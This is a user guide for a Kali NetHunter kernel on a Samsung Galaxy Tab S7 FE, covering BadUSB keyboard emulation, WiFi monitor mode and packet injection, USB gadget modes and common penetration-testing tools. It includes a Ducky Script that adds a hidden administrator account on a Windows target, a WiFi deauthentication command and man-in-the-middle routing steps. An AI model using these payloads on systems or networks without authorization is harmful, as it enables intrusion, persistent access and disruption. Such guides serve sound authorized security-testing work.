# Kali NetHunter Kernel User Guide
## For Samsung Galaxy Tab S7 FE (SM-T733) running LineageOS 22.1

This guide covers how to use the various features of your NetHunter-enabled Samsung Galaxy Tab S7 FE after installing the custom kernel.

## Table of Contents

1. [Initial Setup](#initial-setup)
2. [Installing Kali NetHunter](#installing-kali-nethunter)
3. [HID Attack Framework](#hid-attack-framework)
4. [WiFi Monitoring & Injection](#wifi-monitoring--injection)
5. [USB Gadget Modes](#usb-gadget-modes)
6. [Common Tools](#common-tools)
7. [Troubleshooting](#troubleshooting)

## Initial Setup

After installing the NetHunter kernel on your device, follow these steps to complete the setup:

### 1. Verify Kernel Installation

First, verify that the NetHunter kernel is properly installed:

1. Open a terminal app (like Termux)
2. Run the following command:
   ```bash
   uname -a
   ```
3. The output should include "nethunter-sm-t733" in the kernel version

### 2. Check NetHunter Features

Ensure that kernel supports NetHunter features:

```bash
# Check for HID support
ls /dev/hidg*

# Check for USB gadget support
ls /config/usb_gadget/

# Check for WiFi monitoring capabilities
iw list | grep -i "monitor"
```

## Installing Kali NetHunter

For the best experience, install the full Kali NetHunter suite:

1. Download the NetHunter store app from [nethunter.com/store](https://nethunter.com/store)
2. Install the NetHunter app
3. Open the app and install Kali chroot
4. Install recommended tools and utilities

## HID Attack Framework

The NetHunter kernel enables BadUSB attacks by allowing your tablet to emulate keyboard and mouse input.

### Setting Up HID Attacks

1. Connect your tablet to the target computer using a USB-C cable
2. Open the NetHunter app
3. Navigate to "HID Attack"
4. Select "USB Setup"
5. Choose "HID" from the gadget configuration
6. Click "Start HID"

### Running HID Payloads

1. Select a pre-configured payload or create your own
2. Common payloads include:
   - Windows CMD reverse shell
   - PowerShell script execution
   - Linux Terminal commands
   - macOS Terminal exploitation
3. Click "Execute" to run the payload

### Creating Custom HID Scripts

You can create your own HID attack scripts using the Ducky Script language:

```
# Example Ducky Script to open a command prompt on Windows and create a user
DELAY 500
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING net user hacker Password123 /add
ENTER
DELAY 500
STRING net localgroup administrators hacker /add
ENTER
```

## WiFi Monitoring & Injection

The NetHunter kernel enables advanced WiFi attacks with monitor mode and packet injection support.

### Enabling Monitor Mode

1. Open a terminal (NetHunter Terminal or Termux)
2. Run the following commands:
   ```bash
   # List wireless interfaces
   ip addr

   # Put wlan0 in monitor mode (replace wlan0 with your interface)
   airmon-ng start wlan0
   
   # Verify monitor mode
   iwconfig wlan0mon
   ```

### Capturing WiFi Traffic

1. With monitor mode enabled, run:
   ```bash
   # Basic capture with airodump-ng
   airodump-ng wlan0mon
   
   # Target specific access point
   airodump-ng -c [channel] --bssid [AP MAC] -w capture wlan0mon
   ```

### Packet Injection Testing

Test if packet injection is working correctly:

```bash
# Test injection capability
aireplay-ng --test wlan0mon

# Deauthentication attack example (for testing purposes only)
aireplay-ng --deauth 5 -a [AP MAC] wlan0mon
```

## USB Gadget Modes

The NetHunter kernel supports various USB gadget modes for flexible connectivity options.

### Available Gadget Modes

1. **RNDIS (USB Ethernet)**
   - Appears as a network adapter to the host
   - Allows network sharing and Man-in-the-Middle attacks

2. **Mass Storage**
   - Appears as a USB drive to the host
   - Useful for data exfiltration or providing malicious files

3. **Serial/ACM**
   - Serial connection for console access
   - Useful for debugging and shell access

4. **Multiple Configurations**
   - Combine different gadget types simultaneously

### Setting Up USB Gadgets

1. Open the NetHunter app
2. Go to "USB Arsenal"
3. Select your desired configuration:
   - RNDIS + HID + Storage
   - ECM + Serial
   - Custom configuration
4. Click "Start USB Gadget"

### Using RNDIS for Network Attacks

With RNDIS mode enabled:

1. Connect your tablet to a computer
2. The computer will detect a new network interface
3. Configure networking on your tablet:
   ```bash
   # Set IP on the usb0 interface
   ip addr add 192.168.42.1/24 dev usb0
   ip link set usb0 up
   
   # Enable routing for MITM
   echo 1 > /proc/sys/net/ipv4/ip_forward
   iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
   ```
4. On the target computer, set the default gateway to 192.168.42.1

## Common Tools

Your NetHunter-enabled tablet supports various penetration testing tools:

### Network Analysis

- **Wireshark**: Capture and analyze network traffic 
- **Nmap**: Network discovery and security auditing
- **Ettercap**: For man-in-the-middle attacks
- **Bettercap**: Swiss army knife for network attacks

### Wireless Testing

- **Aircrack-ng Suite**: Complete suite for WiFi assessment
- **Kismet**: Wireless network detector and sniffer
- **Wifite**: Automated wireless attack tool
- **Reaver**: For WPS vulnerability testing

### Web Application Testing

- **Burp Suite**: Web vulnerability scanner
- **OWASP ZAP**: Web app security testing
- **SQLmap**: Automated SQL injection tool

### Exploitation

- **Metasploit Framework**: Exploitation development and execution
- **Social Engineering Toolkit (SET)**: Social engineering attacks
- **Hydra**: Login brute-forcer

## Troubleshooting

### HID Issues

**Problem**: HID device not detected by target computer
**Solution**:
- Check USB cable (use data cable, not just charging)
- Try enabling HID gadget before connecting to target
- Restart the USB Arsenal service

### WiFi Monitor Mode Issues

**Problem**: Cannot enable monitor mode
**Solution**:
- Make sure WiFi is turned on
- Try killing interfering processes:
  ```bash
  airmon-ng check kill
  ```
- Try alternate method:
  ```bash
  ip link set wlan0 down
  iw wlan0 set monitor control
  ip link set wlan0 up
  ```

### USB Gadget Issues

**Problem**: Gadgets not working or detected
**Solution**:
- Try different USB port on host computer
- Check that proper drivers are installed on host
- Restart USB Arsenal
- For Windows hosts, you may need to install RNDIS drivers

### Performance Issues

**Problem**: Tablet running slow or overheating
**Solution**:
- Close unnecessary apps
- Use a cooling pad for extended sessions
- Reduce screen brightness
- Disable unused radios (Bluetooth, NFC)

## Support and Additional Resources

- [Kali NetHunter Wiki](https://www.kali.org/docs/nethunter/)
- [XDA Developers Forum](https://forum.xda-developers.com/)
- [Kali Linux Documentation](https://www.kali.org/docs/)

**Remember**: This kernel and toolset should be used responsibly and legally. Always obtain proper authorization before testing any security measures.